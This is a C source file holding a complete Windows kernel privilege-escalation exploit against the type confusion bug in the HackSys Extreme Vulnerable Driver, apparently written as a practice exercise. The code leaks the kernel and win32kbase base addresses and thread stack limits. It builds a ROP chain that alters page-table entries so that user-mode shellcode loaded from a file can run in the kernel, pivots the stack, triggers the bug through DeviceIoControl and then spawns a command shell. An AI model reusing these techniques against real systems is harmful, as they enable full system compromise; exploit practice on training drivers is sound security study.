#include "main.h"
#include <psapi.h>

BOOL ExploitTypeConfusion()
{

    HANDLE hDevice = INVALID_HANDLE_VALUE;  // handle to the drive to be examined
    BOOL bResult = FALSE;                 // results flag
    DWORD junk = 0;                     // discard results
    HANDLE hFile = NULL;
    LPVOID shellcode;
    char buf[1000] = { 0 };
    PQWORD stackBuffer;
    PVOID reserveSpace = 0;

    hDevice = CreateFileW(DRIVER_NAME,          // drive to open
                          0,                // no access to the drive
                          FILE_SHARE_READ | // share mode
                          FILE_SHARE_WRITE,
                          NULL,             // default security attributes
                          OPEN_EXISTING,    // disposition
                          0,                // file attributes
                          NULL);            // do not copy file attributes

    if (hDevice == INVALID_HANDLE_VALUE)    // cannot open the drive
    {
        printf("[-] Failed opening handle to driver\n");
        bResult = FALSE;
        goto _cleanup;
    }
    printf("[+] Opened driver handle\n");

    // Load shellcode
    hFile = CreateFile(L"sc.bin",               // file to open
                       GENERIC_READ,          // open for reading
                       FILE_SHARE_READ,       // share for reading
                       NULL,                  // default security
                       OPEN_EXISTING,         // existing file only
                       FILE_ATTRIBUTE_NORMAL, // normal file
                       NULL);                 // no attr. template

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open sc.bin file for reading\n");
        bResult = FALSE;
        goto _cleanup;
    }

    DWORD scSize = 0;
    bResult = ReadFile(hFile, buf, 1000, &scSize, NULL);
    if (!bResult) {
        printf("[-] Failed to read shellcode from file: %d\n", GetLastError());
        bResult = FALSE;
        goto _cleanup;
    }
    printf("[*] Shellcode size is: %d\n", scSize);
    CloseHandle(hFile);
    hFile = NULL;

    shellcode = VirtualAlloc(
        NULL,				// Next page to commit
        scSize,		        // Page size, in bytes
        MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
        PAGE_EXECUTE_READWRITE);	// Read/write access

    if (shellcode == NULL) {
        printf("[-] Unable to reserve memory for shellcode!\n");
        bResult = FALSE;
        goto _cleanup;
    }
    memcpy(shellcode, buf, scSize);
    printf("[*] Shellcode at: 0x%llx\n", shellcode);



    // Get ntoskrnl and win32kbase.sys base
    LPVOID drivers[0x500] = { 0 }; // Should be more than enough
    DWORD cbNeeded;
    QWORD ntoskrnlBase = 0;
    QWORD win32kBase = 0;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        for (int i = 0; i < cbNeeded / sizeof(LPVOID); i++) {
            char szDriver[0x100] = { 0 }; // Again, more than enough
            GetDeviceDriverBaseNameA(drivers[i], szDriver, 0x100);
            if (strcmp("ntoskrnl.exe", szDriver) == 0) {
                ntoskrnlBase = (QWORD)drivers[i];
                printf("[+] Found ntoskrnl.exe at: 0x%p\n", ntoskrnlBase);
            }
            if (strcmp("win32kbase.sys", szDriver) == 0) {
                win32kBase = (QWORD)drivers[i];
                printf("[+] Found win32kBase.sys at: 0x%p\n", win32kBase);
            }
            if (win32kBase && ntoskrnlBase) break;
        }
    } else {
        printf("[-] Failed EnumDeviceDrivers: %d\n", GetLastError());
        bResult = FALSE;
        goto _cleanup;
    }

    if (!ntoskrnlBase) {
        printf("[-] Failed to find the base of ntoskrnl.exe\n");
        bResult = FALSE;
        goto _cleanup;
    }
    if (!win32kBase) {
        printf("[-] Failed to find the base of win32kBase.sys\n");
        bResult = FALSE;
        goto _cleanup;
    }


    // Allocating the stack pivot buffer and preparing rop chain
    // This allocates memory some pages below the stack pivot's address, for the system's use in normal page faults
    reserveSpace = VirtualAlloc( (LPVOID)(STACK_PIVOT_ADDR - 0x1000), 0xA000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (reserveSpace == NULL) {
        printf("[-] Failed allocating enough room for stack for pivot: %d\n", GetLastError());
        bResult = FALSE;
        goto _cleanup;
    }

    // Write and read some bytes to different memory pages so they are actually commited and used by the system
    // Otherwise, page fault's trap frames that the kernel will try to locate there will fault themselves and that will cause a DOUBLE FAULT bug check
    printf("[*] Reserved space at: 0x%llx\n", reserveSpace);
    *(ULONGLONG*)reserveSpace = 0xAABBCCDDAABBCCDD;
    printf("[*] Data at reserved space: 0x%llx\n", *(ULONGLONG*)reserveSpace);
    *(ULONGLONG*)(0x8bff8eb0) = 0xDEADBEEFDEADBEEF;
    *(ULONGLONG*)(0x8bff7eb0) = 0xDEADBEEFDEADBEEF;
    *(ULONGLONG*)(0x8bff6eb0) = 0xDEADBEEFDEADBEEF;
    *(ULONGLONG*)(0x8bff5eb0) = 0xDEADBEEFDEADBEEF;
    printf("[*] Data at wanna be trap frame: 0x%llx\n", *(ULONGLONG*)(0x8bff8eb0));

    /////// Get out kernel thread's stack limit address
    HMODULE ntdll = GetModuleHandleA("ntdll");
    _NtQuerySystemInformation query = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (query == NULL) {
        printf("[-] GetProcAddress(NtQuerySystemInformation) failed.\n");
        return 1;
    }
    ULONG len = 2000;
    NTSTATUS status = NULL;
    PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo = NULL;
    do {
        len *= 2;
        pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
        status = query(SystemExtendedProcessInformation, pProcessInfo, len, &len);
    } while (status == STATUS_INFO_LENGTH_MISMATCH);
    if (status != STATUS_SUCCESS) {
        printf("[-] NtQuerySystemInformation failed with error code 0x%X\n", status);
        return 1;
    }

    UNICODE_STRING myProc = { 0 };
    my_RtlInitUnicodeString myRtlInitUnicodeString = (my_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
    my_RtlEqualUnicodeString myRtlEqualUnicodeString = (my_RtlEqualUnicodeString)GetProcAddress(ntdll, "RtlEqualUnicodeString");
    if (myRtlInitUnicodeString == NULL || myRtlEqualUnicodeString == NULL) {
        printf("[-] Failed initializing unicode functions\n");
        bResult = FALSE;
        goto _cleanup;
    }

    myRtlInitUnicodeString(&myProc, L"HevdExploits.exe");
    printf("[+] Iterating processes threads, looking for our kernel stack address\n");
    PVOID stackLimit = NULL;
    while (pProcessInfo != NULL) {
        if (myRtlEqualUnicodeString(&(pProcessInfo->ImageName), &myProc, TRUE)) {
            printf("[*] Process: %wZ\n", pProcessInfo->ImageName);
            for (unsigned int i = 0; i < pProcessInfo->NumberOfThreads; i++) {
                PVOID stackBase = pProcessInfo->Threads[i].StackBase;
                stackLimit = pProcessInfo->Threads[i].StackLimit;
                printf("\tStack base 0x%llx\n", stackBase);
                printf("\tStack limit 0x%llx\n", stackLimit);
                break;
            }
        }

        if (!pProcessInfo->NextEntryOffset) {
            pProcessInfo = NULL;
        } else {
            pProcessInfo = (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo + pProcessInfo->NextEntryOffset);
        }
    }
    printf("[+] Stack limit: 0x%llx\n", stackLimit);


    // Build rop chain
    stackBuffer = STACK_PIVOT_ADDR;
    printf("[*] New stack at: 0x%llx\n", stackBuffer);
    int index = 0;
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + POP_RCX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(shellcode);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + MiGetPteAddressOffset);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + MOV_RAX_TO_R8);
    // The gadgets contains "add rsp, 0x28" so the following is junk
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(0x1122334455667788);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(win32kBase + MOV_R8_TO_RDX);
    // The gadgets contains "add rsp, 0x28" so the following is junk
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(0xAABBCCDDAABBCCDD);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + MOV_RAX_PTR_RAX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + MOV_RAX_TO_R8);
    // The gadgets contains "add rsp, 0x28" so the following is junk
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(0x1122334455667788);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(NOP);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + MOV_R8_TO_RCX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + MOV_FOUR_RAX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + SUB_RCX_RAX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(win32kBase + MOV_RCX_TO_RAX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(win32kBase + MOV_RAX_TO_POINTER_RDX);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(ntoskrnlBase + WBINVD_GADGET);
    *(QWORD*)(stackBuffer + index++) = (QWORD)(shellcode);
    // Push the stackLimit for the shellcode
    *(QWORD*)(stackBuffer + index++) = (QWORD)(stackLimit);


    // This is the TypeConfusion payload
    // The ClientID member is ignored
    TypeConfBuffer tcBuf = { 0 };
    tcBuf.junkClientID = 0xAABBCCDDEEFFEEDD;
    tcBuf.controllableFunc = (QWORD)ntoskrnlBase + STACK_PIVOT_GADGET;

    printf("[+] Trigerring Type Confusion vulnerability..\n");
    getchar();
    bResult = DeviceIoControl(hDevice,
                              HEVD_IOCTL_TYPE_CONFUSION,
                              &tcBuf, sizeof(tcBuf),
                              NULL, 0,
                              &junk,
                              (LPOVERLAPPED)NULL);

    if (!bResult) {
        printf("[-] IOCTL failed\n");
        bResult = FALSE;
        goto _cleanup;
    }
    //printf("[+] IOCTL Success!\n");

    //getchar();
    system("cmd.exe");
    exit(0);
    //TerminateProcess(GetCurrentProcess(), 0);


_cleanup:
    if (hDevice) CloseHandle(hDevice);
    if (hFile) CloseHandle(hFile);
    if (reserveSpace) VirtualFree(reserveSpace, 0, MEM_RELEASE);


    return bResult;
}